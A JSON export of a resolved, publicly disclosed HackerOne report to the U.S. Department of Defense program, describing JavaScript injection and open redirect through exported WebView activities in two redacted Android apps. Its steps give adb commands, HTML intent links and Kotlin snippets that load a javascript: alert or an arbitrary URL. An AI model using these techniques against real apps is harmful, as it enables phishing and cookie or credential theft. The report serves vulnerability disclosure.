{
  "id": 2555949,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTU1OTQ5",
  "url": "https://hackerone.com/reports/2555949",
  "title": "█████████ (Android): Vulnerable to Javascript Injection and Open redirect",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2024-06-17T22:06:09.511Z",
  "submitted_at": "2024-06-17T22:11:48.065Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "cleanchain50",
    "url": "/cleanchain50",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/knzys59hanllduxn24updm21emzy/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2024-07-26T15:00:23.640Z",
  "bug_reporter_agreed_on_going_public_at": "2024-07-23T00:26:00.584Z",
  "team_member_agreed_on_going_public_at": "2024-07-26T15:00:23.486Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Description:**\nGood afternoon,\n\nI have discovered a misconfiguration in the WebView components of two apps, ████. This vulnerability allows an attacker to execute JavaScript and open any URL through a link or a malicious app.\n\nThe root cause of this issue is that certain activities are exported and set as browsable, exposing them to potential exploitation.\n████████\n\n## Impact\n\nThe potential impact of this vulnerability is high, as it allows an attacker to execute XSS within the WebView and open any HTTPS website. Possible attacks include phishing, creating fake login pages, and stealing service members' credentials. This could result in not only taking over ██████████ accounts but also potentially accessing other military applications and websites.\n\nAdditionally, the ability to execute JavaScript in these WebViews could enable attackers to steal cookies, further compromising user security.\n\n## System Host(s)\n███\n\n## Affected Product(s) and Version(s)\n\n\n## CVE Numbers\n\n\n## Steps to Reproduce\n**My Military One Source: **\n\nadb shell am start -n ████/████████.kotlin.MVVM.Utils.Web.WebviewActivity --es URL \"javascript:(function() { alert('XSS by Cleanchain') })();\"\n\nadb shell am start -n ████████/███.kotlin.MVVM.Utils.Web.WebviewActivity --es URL \"https://URL\"\n\nBrowser Example:\n\n```\n<body>\n    <a href=\"intent://app/feedback#Intent;scheme=mymos;package=█████████;S.URL=javascript:(function() { alert('XSS by Cleanchain') })();end\">Open XSS</a>\n\n    <a href=\"intent://app/feedback#Intent;scheme=mymos;package=█████████;S.URL=https://URL;end\">Open URL</a>\n\n</body>\n```\n\n\nMalicious App Example:\n\n```\nval intent = Intent().apply {  \n    setClassName(\"█████\", \"███████.kotlin.MVVM.Utils.Web.WebviewActivity\")  \n    putExtra(\"URL\", \"javascript:(function() { alert('XSS by Cleanchain') })()\")  \n}  \nstartActivity(intent)\n\nval intent = Intent().apply {  \n    setClassName(\"████\", \"██████.kotlin.MVVM.Utils.Web.WebviewActivity\")  \n    putExtra(\"URL\", \"https://URL\")  \n}  \nstartActivity(intent)\n```\n\n\n**Chill Drills:**\n\nadb shell am start -n ██████████/███████.Utils.Web.WebviewActivity --es URL \"javascript:(function() { alert('XSS by Cleanchain') })();\"\n\nadb shell am start -n ██████/█████████.Utils.Web.WebviewActivity --es URL \"https://URL\"\n\nBrowser Example:\n\n```\n<body>\n    <a href=\"intent://app/feedback#Intent;scheme=chdr;package=██████████;S.URL=javascript:(function() { alert('XSS by Cleanchain') })();end\">Open XSS - █████████</a>\n\n    <a href=\"intent://app/feedback#Intent;scheme=chdr;package=███;S.URL=https://URL;end\">Open URL - ███</a>\n\n</body>\n```\n\n\nMalicious App Example:\n\n```\nval intent = Intent().apply {  \n    setClassName(\"██████\", \"████████.Utils.Web.WebviewActivity\")  \n    putExtra(\"URL\", \"javascript:(function() { alert('XSS by Cleanchain') })()\")  \n}  \nstartActivity(intent)\n\nval intent = Intent().apply {  \n    setClassName(\"███████\", \"████████.Utils.Web.WebviewActivity\")  \n    putExtra(\"URL\", \"https://URL\")  \n}  \nstartActivity(intent)\n```\n\n## Suggested Mitigation/Remediation Actions\n\n\n",
  "weakness": {
    "id": 53,
    "name": "Open Redirect"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 40,
  "voters": [
    "tinmo",
    "zy9ard3",
    "address_below0",
    "shubham_srt",
    "spaghettisec",
    "iwasday",
    "iamunixtz",
    "idealphaseth",
    "eminfidan",
    "xgodmarios88",
    "and 30 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
